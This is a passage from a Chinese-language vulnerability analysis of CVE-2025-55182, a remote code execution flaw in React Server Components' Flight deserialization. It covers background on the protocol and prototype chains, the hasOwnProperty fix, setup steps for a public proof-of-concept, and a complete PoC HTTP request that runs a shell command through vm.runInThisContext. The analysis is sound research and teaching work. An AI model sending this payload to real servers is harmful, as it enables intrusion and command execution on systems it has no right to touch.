</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">moduleExports</span><span class="p">[</span><span class="nx">metadata</span><span class="p">[</span><span class="nx">NAME</span><span class="p">]];</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="p">(</span><span class="kc">undefined</span><span class="o">:</span> <span class="nx">any</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>代码修复里面添加了hasOwnProperty 检查，只允许访问对象自身的属性</p>
<p>而在漏洞版本，攻击者可以控制 <code>metadata[2]</code>，可读取任意属性（包括原型链上的），如：</p>
<ul>
<li><code>__proto__.toString</code></li>
<li><code>constructor.prototype</code></li>
<li>甚至获取危险方法（如 vm.runInThisContext）</li>
</ul>
<p>CVE-2025-55182 漏洞的产生原因是React Server Components (RSC) 的 Flight 协议反序列化逻辑中存在不安全的处理。</p>
<p>漏洞的核心问题在于：路径解析逻辑未通过 <code>hasOwnProperty</code> 限制可访问的属性范围，导致攻击者可以沿原型链访问任意属性，包括 <code>__proto__</code>、<code>constructor</code> 等敏感属性。</p>
<h2 id="背景知识" class="heading-element"><span>背景知识</span>
  <a href="#%e8%83%8c%e6%99%af%e7%9f%a5%e8%af%86" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><h3 id="rsc" class="heading-element"><span>RSC</span>
  <a href="#rsc" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>React Server Components（RSC，React 服务端组件）是 React 19 推出的核心特性—— 核心是将组件逻辑拆分到服务端执行，仅向客户端传递 “渲染指令” 而非完整 JS 代码，既解决了客户端渲染（CSR）首屏慢、JS 体积大的问题，又弥补了传统 SSR 全量水合、服务端仅输出静态 HTML 的缺陷。</p>
<p>RSC 的核心思想是：<strong>将一部分 React 组件的渲染工作完全放在服务器上完成，并将这些服务器组件的渲染结果以一种特殊的数据格式流式传输到客户端，而不需要将这些组件的 JavaScript 代码发送到客户端。</strong></p>
<p>为了实现这一目标，React 团队设计了一个全新的网络协议，称之为 <strong>‘Flight’ 协议</strong>，它是一种高度优化的、增量的、可流式传输的自定义序列化格式，专为传输 React 元素树和其所需的数据而设计。它允许服务器发送“指令”给客户端，告知客户端如何构建或更新 UI，而不是发送预先渲染好的 HTML 片段或者完整的 JavaScript 组件代码。</p>
<p>RSC的一些术语包括：</p>
<table>
  <thead>
      <tr>
          <th>术语</th>
          <th>运行位置</th>
          <th>核心能力</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>服务端组件（SC）</td>
          <td>服务端</td>
          <td>1. 支持 async/await 直接请求数据；<br />2. 直接访问服务端资源；<br />3. 代码不暴露给客户端</td>
      </tr>
      <tr>
          <td>客户端组件（CC）</td>
          <td>客户端</td>
          <td>1. 支持所有 React 钩子；<br />2. 访问浏览器 API；<br />3. 实现交互逻辑（点击、输入）</td>
      </tr>
      <tr>
          <td>Server Actions</td>
          <td>服务端</td>
          <td>标记<code>'use server'</code>的函数，处理表单提交、数据写入等服务端操作</td>
      </tr>
      <tr>
          <td>React Server Payload</td>
          <td>传输格式</td>
          <td>SC 渲染后的序列化数据（JSON / 二进制），<br />客户端仅解析渲染，不执行代码</td>
      </tr>
  </tbody>
</table>
<p>其中要提一下的是React Server Actions，它是 React 18 引入并完全集成在 Next.js 13+ App Router 中的一项功能。它允许开发者定义<strong>服务端函数</strong>，并在客户端组件中直接调用，而无需显式创建 API 路由。</p>
<p>当 Server Action 被调用时：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">┌───────────────────────────────────────────────────────────────────────────────┐
</span></span><span class="line"><span class="cl">│                        SERVER ACTION 流程                                      │
</span></span><span class="line"><span class="cl">├───────────────────────────────────────────────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│                                                                               │
</span></span><span class="line"><span class="cl">│   客户端 (Client)                  网络 (Network)              服务端 (Server)   │
</span></span><span class="line"><span class="cl">│   ──────────────                  ───────────                ────────────     │
</span></span><span class="line"><span class="cl">│   1. 用户提交表单                                                               │
</span></span><span class="line"><span class="cl">│          ↓                                                                    │
</span></span><span class="line"><span class="cl">│   2. React 使用 Flight            POST /                                       │
</span></span><span class="line"><span class="cl">│      协议序列化参数                 multipart/form-data      3. Next.js 接收请求  │
</span></span><span class="line"><span class="cl">│          └────────────────────►  Next-Action: &lt;id&gt;               ↓            │
</span></span><span class="line"><span class="cl">│                                                           4. Flight反序列化参数 │
</span></span><span class="line"><span class="cl">│                                                                  ↓            │
</span></span><span class="line"><span class="cl">│                                                           5.执行Server Action  │
</span></span><span class="line"><span class="cl">│   7. React根据响应包            Flight序列化的响应                   ↓            │
</span></span><span class="line"><span class="cl">│      更新客户端 UI       ◄─────────────────────────────     6. Flight序列化返回值 │
</span></span><span class="line"><span class="cl">└───────────────────────────────────────────────────────────────────────────────┘</span></span></code></pre></td></tr></table>
</div>
</div><p>当调用 Server Action 时，Next.js 会发送一个带有<code>Next-Action</code>特殊标头的 POST 请求：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">POST /page HTTP/1.1
</span></span><span class="line"><span class="cl">Host: example.com
</span></span><span class="line"><span class="cl">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary...
</span></span><span class="line"><span class="cl">Next-Action: 1234567890abcdef        ← Server Action 标识符
</span></span><span class="line"><span class="cl">Next-Router-State-Tree: ...          ← 客户端路由状态</span></span></code></pre></td></tr></table>
</div>
</div><p><code>Next-Action</code> 标头告知服务器执行哪个已注册的函数。请求体包含序列化后的参数。</p>
<h3 id="flight协议" class="heading-element"><span>Flight协议</span>
  <a href="#flight%e5%8d%8f%e8%ae%ae" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>截至目前，ReactFlight 协议的文档并不完善，对它的理解主要基于逆向工程和社区示例。Flight 协议属于 React 内部核心机制，无独立官方文档，所有细节均在 <strong>React 源码</strong> 和 <strong>官方 RSC 示例仓库</strong> 中。</p>
<p>在典型的 Server Action 请求中，Next.js / React 发送 <code>multipart/form-data</code> 请求，表单字段结构如下：</p>
<ul>
<li><code>name=&quot;0&quot;</code>: 主 payload（如参数列表）</li>
<li><code>name=&quot;1&quot;</code>: 第 1 个模型块（model chunk）</li>
<li><code>name=&quot;2&quot;</code>: 第 2 个模型块</li>
<li><code>...</code> : 更多块</li>
</ul>
<p>Flight 协议使用 <code>$</code> 前缀加数字表示对特定 chunk 的引用，冒号分隔的路径用于访问嵌套属性：</p>
<ul>
<li><code>&quot;$1&quot;</code>: 引用 chunk1 本身</li>
<li><code>&quot;$2:fruitName&quot;</code>: 引用 chunk2 解析后对象的 <code>fruitName</code> 属性</li>
<li><code>&quot;$3:user:email&quot;</code>: 引用 chunk3 中的 <code>.user.email</code></li>
</ul>
<p>假设客户端发送如下请求体：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">------WebKitFormBoundaryABC123
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;0&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">[&#34;$1:profile:name&#34;]
</span></span><span class="line"><span class="cl">------WebKitFormBoundaryABC123
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;1&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">{&#34;profile&#34;:{&#34;name&#34;:&#34;alice&#34;,&#34;age&#34;:18}}
</span></span><span class="line"><span class="cl">------WebKitFormBoundaryABC123--</span></span></code></pre></td></tr></table>
</div>
</div><p>可以看作：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">chunks</span> <span class="o">=</span> <span class="p">{</span>  
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;0&#34;</span><span class="o">:</span> <span class="s1">&#39;[&#34;$1:profile:name&#34;]&#39;</span><span class="p">,</span>  
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;1&#34;</span><span class="o">:</span> <span class="s1">&#39;{&#34;profile&#34;:{&#34;name&#34;:&#34;alice&#34;,&#34;age&#34;:18}}&#39;</span>  
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p><strong>解析过程：</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#34;$1:profile:name&#34;  
</span></span><span class="line"><span class="cl">  → 查找 chunk1 并解析：{&#34;profile&#34;:{&#34;name&#34;:&#34;alice&#34;,&#34;age&#34;:18}}  
</span></span><span class="line"><span class="cl">  → 访问路径 .profile.name  
</span></span><span class="line"><span class="cl">  → 返回 &#34;alice&#34;</span></span></code></pre></td></tr></table>
</div>
</div><p>具体的代码逻辑会在后面进行解释。</p>
<h3 id="js原型污染" class="heading-element"><span>JS原型污染</span>
  <a href="#js%e5%8e%9f%e5%9e%8b%e6%b1%a1%e6%9f%93" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>JavaScript 使用原型实现继承。每个对象都引用一个原型，原型本身也是一个对象，并且原型本身也有一个原型，依此类推，直到我们得到最基本原型，它被称为Object.prototype，其自身原型是null。</p>
<p>在原型链污染攻击中，攻击者会更改内置原型（例如<code>Object.prototype</code>），导致所有派生对象都具有额外的属性，包括攻击者无法直接访问的对象。</p>
<p>如果攻击者控制并修改了一个对象的原型，那将可以影响所有和这个对象来自同一个类、父类的对象，这种攻击方式就是原型链污染</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">foo</span> <span class="o">=</span> <span class="p">{</span><span class="nx">bar</span><span class="o">:</span><span class="mi">1</span><span class="p">};</span>       <span class="c1">// foo是一个简单的JavaScript对象，foo.bar此时为1
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="nx">foo</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">bar</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>  <span class="c1">// 修改foo的原型（即object）
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">foo</span><span class="p">.</span><span class="nx">bar</span><span class="p">);</span>   <span class="c1">// 查找顺序原因，foo.bar仍然是1
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">zoo</span> <span class="o">=</span> <span class="p">{};</span>           <span class="c1">// 此时用objecr创建一个空的zoo对象
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">zoo</span><span class="p">.</span><span class="nx">bar</span><span class="p">);</span>   <span class="c1">// 查看zoo.bar，结果为2
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="nx">原因</span><span class="err">：</span>
</span></span><span class="line"><span class="cl">	<span class="nx">修改</span> <span class="nx">foo</span> <span class="nx">原型foo</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">bar</span> <span class="o">=</span> <span class="mi">2</span><span class="err">，</span><span class="nx">而</span> <span class="nx">foo</span> <span class="nx">是一个object类的实例</span><span class="err">，</span><span class="nx">所以实际上是修改了object这个类</span><span class="err">，</span><span class="nx">给这个类增加了一个属性bar</span><span class="err">，</span><span class="nx">值为2</span>
</span></span><span class="line"><span class="cl">	<span class="nx">后来用object类创建了一个zoo对象</span><span class="err">，</span><span class="kd">let</span> <span class="nx">zoo</span> <span class="o">=</span> <span class="p">{}</span><span class="err">，</span><span class="nx">zoo对象自然也有一个bar属性了</span></span></span></code></pre></td></tr></table>
</div>
</div><p>更多东西可以查阅下 Node.js原型链污染的相关文章。</p>
<p>在 JavaScript 中，使用方括号 <code>obj[key]</code> 访问属性时，会<strong>遍历整个原型链</strong>。这意味着：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">fs</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;fs&#39;</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl"><span class="nx">fs</span><span class="p">[</span><span class="s1">&#39;readFileSync&#39;</span><span class="p">]</span> <span class="c1">// ✅ 正常：访问自己的属性 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">fs</span><span class="p">[</span><span class="s1">&#39;constructor&#39;</span><span class="p">]</span> <span class="c1">// ⚠️ 危险：访问到 Object.prototype.constructor 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">fs</span><span class="p">[</span><span class="s1">&#39;__proto__&#39;</span><span class="p">]</span> <span class="c1">// ⚠️ 危险：访问到 Object.prototype
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>攻击者可以利用这个特性，通过 <code>#constructor</code>、<code>#__proto__</code> 等特殊属性名，访问到模块导出对象的原型链属性。</p>
<h2 id="漏洞分析1-基于简易环境" class="heading-element"><span>漏洞分析1-基于简易环境</span>
  <a href="#%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%901-%e5%9f%ba%e4%ba%8e%e7%ae%80%e6%98%93%e7%8e%af%e5%a2%83" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>这个漏洞分析是基于Github漏洞分析简易环境：https://github.com/ejpir/CVE-2025-55182-poc</p>
<p>这里关注RSC漏洞的核心问题，忽略了Flight协议部分。</p>
<p><strong>环境搭建</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">git clone https://github.com/ejpir/CVE-2025-55182-poc
</span></span><span class="line"><span class="cl"><span class="nb">cd</span> CVE-2025-55182-poc
</span></span><span class="line"><span class="cl">npm install  <span class="c1"># Install dependencies</span>
</span></span><span class="line"><span class="cl">npm start    <span class="c1"># Start vulnerable server (port 3002)</span></span></span></code></pre></td></tr></table>
</div>
</div><h3 id="攻击流程" class="heading-element"><span>攻击流程</span>
  <a href="#%e6%94%bb%e5%87%bb%e6%b5%81%e7%a8%8b" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>我们看这个POC：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/formaction</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">multipart/form-data; boundary=----Boundary</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">------Boundary
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;$ACTION_REF_0&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">------Boundary
</span></span><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;$ACTION_0:0&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">{&#34;id&#34;:&#34;vm#runInThisContext&#34;,&#34;bound&#34;:[&#34;process.mainModule.require(&#39;child_process&#39;).execSync(&#39;id&#39;).toString()&#34;]}
</span></span><span class="line"><span class="cl">------Boundary--</span></span></code></pre></td></tr></table>
</div>
</div><p>完整的攻击流程如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1. 攻击者发送恶意 HTTP POST 请求
</span></span><span class="line"><span class="cl">   ↓
</span></span><span class="line"><span class="cl">2. 请求包含 $ACTION_REF_0 和 $ACTION_0:0 字段
</span></span><span class="line"><span class="cl">   ↓
</span></span><span class="line"><span class="cl">3. decodeAction() 解析请求
</span></span><span class="line"><span class="cl">   ↓
</span></span><span class="line"><span class="cl">4. resolveServerReference() 解析模块ID（如 &#34;vm#runInThisContext&#34;）
</span></span><span class="line"><span class="cl">   ↓
</span></span><span class="line"><span class="cl">5. requireModule() 加载模块并访问导出
</span></span><span class="line"><span class="cl">   ↓
</span></span><span class="line"><span class="cl">6. moduleExports[metadata[2]] 访问原型链 ⚠️
</span></span><span class="line"><span class="cl">   ↓
</span></span><span class="line"><span class="cl">7. 返回危险函数（如 vm.runInThisContext）
</span></span><span class="line"><span class="cl">   ↓
</span></span><span class="line"><span class="cl">8. 函数被调用，执行攻击者代码（如 execSync(&#39;id&#39;) ）  💣 💥</span></span></code></pre></td></tr></table>
</div>
</div><p><a class="lightgallery" href="/posts/cve-2025-55182_react2shell/resource/CVE-2025-55182_ReactServerComponents_RSC_RCE%E7%A0%94%E7%A9%B6%E8%B5%84%E6%96%99.assets/file-20260104155708321.png?size=large" data-thumbnail="/posts/cve-2025-55182_react2shell/resource/CVE-2025-55182_ReactServerComponents_RSC_RCE%E7%A0%94%E7%A9%B6%E8%B5%84%E6%96%99.assets/file-20260104155708321.png?size=small" data-sub-html="<h2>img</h2>"><img loading="lazy" src="/posts/cve-2025-55182_react2shell/resource/CVE-2025-55182_ReactServerComponents_RSC_RCE%E7%A0%94%E7%A9%B6%E8%B5%84%E6%96%99.assets/file-20260104155708321.png" alt="img" srcset="/posts/cve-2025-55182_react2shell/resource/CVE-2025-55182_ReactServerComponents_RSC_RCE%E7%A0%94%E7%A9%B6%E8%B5%84%E6%96%99.assets/file-20260104155708321.png?size=small, /posts/cve-2025-55182_react2shell/resource/CVE-2025-55182_ReactServerComponents_RSC_RCE%E7%A0%94%E7%A9%B6%E8%B5%84%E6%96%99.assets/file-20260104155708321.png?size=medium 1.5x, /posts/cve-2025-55182_react2shell/resource/CVE-2025-55182_ReactServerComponents_RSC_RCE%E7%A0%94%E7%A9%B6%E8%B5%84%E6%96%99.assets/file-20260104155708321.png?size=large 2x" data-title="img" style="--width: 880px;--aspect-ratio: 880 / 759;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<h3 id="serverjs" class="heading-element"><span>server.js</span>
  <a href="#serverjs" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>看漏洞复现环境中的server.js，看看都做了什么。</p>
<p>添加相应注释后：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span></code></pre></td>
<td class="lntd">
